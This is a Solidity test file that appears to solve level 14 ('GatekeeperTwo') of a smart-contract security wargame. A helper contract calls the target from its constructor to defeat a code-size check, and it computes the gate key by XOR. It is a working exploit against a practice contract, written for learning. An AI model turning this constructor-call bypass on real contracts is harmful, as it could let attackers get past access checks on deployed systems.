// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {BaseTest} from "./BaseTest.sol";
import {GatekeeperTwoFactory} from "../src/levels/14-GatekeeperTwoFactory.sol";
import {GatekeeperTwo} from "../src/levels/14-GatekeeperTwo.sol";

contract Caller {
    constructor(GatekeeperTwo target) {
        uint64 left = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 key = left ^ (type(uint64).max);
        target.enter(bytes8(key));
    }
}

contract GatekeeperTwoSolution is BaseTest {

    function solution(address payable target_) internal override{
        GatekeeperTwo target = GatekeeperTwo(target_);
        new Caller(target);
    }

    function construction() internal override returns(address payable ) {
        return payable(address(new GatekeeperTwoFactory()));
    }
}
